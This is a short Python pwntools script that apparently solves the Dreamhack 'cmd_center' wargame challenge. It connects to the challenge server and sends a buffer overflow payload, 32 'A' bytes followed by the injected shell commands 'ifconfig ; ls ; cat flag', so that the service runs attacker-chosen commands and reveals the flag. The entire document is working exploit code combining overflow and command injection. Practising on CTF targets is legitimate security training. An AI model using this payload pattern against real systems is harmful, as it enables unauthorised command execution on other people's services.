from pwn import *

#p = process('./cmd_center')
p = remote('host3.dreamhack.games', '22996')
payload = b"A"*0x20 + b'ifconfig ; ls ; cat flag'

# ifconfig -> \x69\x66\x63\x6f\x6e\x66\x69\x67
# gifnocfi -> \x67\x69\x66\x6e\x6f\x63\x66\x69
p.sendline(payload)
p.interactive()